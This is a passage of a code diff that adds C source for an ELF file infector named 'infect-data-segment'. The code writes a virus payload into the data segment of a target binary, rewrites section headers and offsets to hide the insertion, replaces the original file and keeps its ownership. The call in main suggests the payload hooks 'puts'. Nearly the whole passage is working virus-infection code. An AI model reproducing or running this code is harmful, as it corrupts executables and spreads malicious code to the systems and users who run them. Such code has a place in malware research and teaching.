+        if (mktemp(tempname) == NULL) {
+                perror("mktemp");
+                exit(1);
+        }
+
+	out = open(tempname, O_WRONLY | O_CREAT | O_EXCL, st_buf.st_mode);
+	if (out < 0) {
+		perror("open");
+		exit(1);
+	}
+
+	addlen2 = addlen + sizeof(DEBUG_STRING);
+	addlen3 = addlen2 + sizeof(Elf32_Shdr);
+
+	bin.ehdr.e_shoff += addlen2;
+	++bin.ehdr.e_shstrndx;
+	++bin.ehdr.e_shnum;
+
+	if (write(out, &bin.ehdr, sizeof(Elf32_Ehdr)) != sizeof(Elf32_Ehdr)) {
+		perror("write");
+		goto cleanup;
+	}
+
+	--bin.ehdr.e_shnum;
+	--bin.ehdr.e_shstrndx;
+
+	if (write(out, bin.phdr, bin.plen) != bin.plen) {
+		perror("write");
+		goto cleanup;
+	}
+
+	for (i = 0; i < bin.bss; i++) {
+		if (lseek(out, bin.shdr[i].sh_offset, SEEK_SET) < 0)
+			goto cleanup;
+		if (write(
+			out, bin.section[i], bin.shdr[i].sh_size
+		) != bin.shdr[i].sh_size)
+			goto cleanup;
+	}
+
+	zero = (char *)malloc(bss_len);
+	memset(zero, 0, bss_len);
+
+	if (write(out, zero, bss_len) != bss_len) {
+		perror("write");
+		goto cleanup;
+	}
+
+	if (write(out, get_virus(), len) != len) {
+		perror("write");
+		goto cleanup;
+	}
+
+	for (i = bin.bss + 1; i <= bin.ehdr.e_shstrndx; i++) {
+		if (lseek(out, addlen + bin.shdr[i].sh_offset, SEEK_SET) < 0)
+			goto cleanup;
+		if (write(
+			out, bin.section[i], bin.shdr[i].sh_size
+		) != bin.shdr[i].sh_size)
+			goto cleanup;
+	}
+
+	if (write(
+		out, DEBUG_STRING, sizeof(DEBUG_STRING)
+	) != sizeof(DEBUG_STRING)) {
+		perror("write");
+		goto cleanup;
+	}
+
+	if (lseek(out, bin.ehdr.e_shoff, SEEK_SET) < 0) goto cleanup;
+
+	for (i = 0; i < bin.bss; i++)
+		if (write(
+			out, &bin.shdr[i], sizeof(Elf32_Shdr)
+		) != sizeof(Elf32_Shdr))
+			goto cleanup;
+
+	newshdr.sh_name = bin.shdr[bin.ehdr.e_shstrndx].sh_size;
+	newshdr.sh_type = SHT_PROGBITS;
+	newshdr.sh_flags = SHF_ALLOC | SHF_WRITE;
+	newshdr.sh_addr = bin.shdr[i].sh_addr;
+	newshdr.sh_offset = offset;
+	newshdr.sh_size = addlen;
+	newshdr.sh_link = 0;
+	newshdr.sh_info = 0;
+	newshdr.sh_addralign = 0;
+	newshdr.sh_entsize = 0;
+
+	if (write(out, &newshdr, sizeof(Elf32_Shdr)) != sizeof(Elf32_Shdr))
+		goto cleanup;
+
+	bin.shdr[i].sh_offset += addlen;
+	bin.shdr[i].sh_addr += addlen;
+	bin.shdr[i].sh_size = 0;
+
+	if (write(
+		out, &bin.shdr[i], sizeof(Elf32_Shdr)
+	) != sizeof(Elf32_Shdr))
+		goto cleanup;
+
+	for (++i; i < bin.ehdr.e_shstrndx; i++) {
+		bin.shdr[i].sh_offset += addlen;
+		if (write(
+			out, &bin.shdr[i], sizeof(Elf32_Shdr)
+		) != sizeof(Elf32_Shdr))
+			goto cleanup;
+	}
+
+	bin.shdr[i].sh_size += sizeof(DEBUG_STRING);
+	bin.shdr[i].sh_offset += addlen;
+	if (write(
+		out, &bin.shdr[i], sizeof(Elf32_Shdr)
+	) != sizeof(Elf32_Shdr))
+		goto cleanup;
+
+	for (++i; i < bin.ehdr.e_shnum; i++) {
+		bin.shdr[i].sh_offset += addlen3;
+		if (write(
+			out, &bin.shdr[i], sizeof(Elf32_Shdr)
+		) != sizeof(Elf32_Shdr))
+			goto cleanup;
+	}
+
+	for (i = bin.ehdr.e_shstrndx + 1; i < bin.ehdr.e_shnum; i++) {
+		if (lseek(out, addlen3 + bin.shdr[i].sh_offset, SEEK_SET) < 0)
+			goto cleanup;
+		if (write(
+			out, bin.section[i], bin.shdr[i].sh_size
+		) != bin.shdr[i].sh_size)
+			goto cleanup;
+	}
+
+        if (rename(tempname, host) < 0) {
+                perror("rename");
+                exit(1);
+        }
+
+        if (fchown(out, st_buf.st_uid, st_buf.st_gid) < 0) {
+                perror("chown");
+                exit(1);
+        }
+
+
+	free(zero);
+
+	return;
+
+cleanup:
+	unlink(tempname);
+	exit(1);
+}
+
+int main(int argc, char *argv[])
+{
+	if (argc != 2) {
+		fprintf(stderr, "usage: infect-data-segment filename\n");
+		exit(1);
+	}
+
+        infect_elf(
+                argv[1],
+                get_virus, init_virus,
+                VIRUS_LENGTH,
+		"puts"
+        );
+
+	exit(0);
+}
